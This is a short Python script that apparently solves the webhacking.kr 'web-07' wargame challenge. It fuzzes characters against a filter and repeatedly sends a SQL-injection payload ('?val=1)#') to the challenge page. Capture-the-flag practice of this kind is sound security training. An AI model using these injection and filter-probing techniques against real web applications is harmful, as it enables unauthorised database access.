import requests

# lv=2 doesn't exist, we need to induce it
url = 'https://webhacking.kr/challenge/web-07/index.php'

# for i in range(25,128):
    # query = '?val=7' + chr(i)
    # response = requests.get(url+query)
    # if 'Access Denied!' not in response.text:
        # print(i)

query = '?val=1)#'
for i in range(15):
   response = requests.get(url+query)
   print(response.text)
   if 'nice try!' not in response.text:
       break

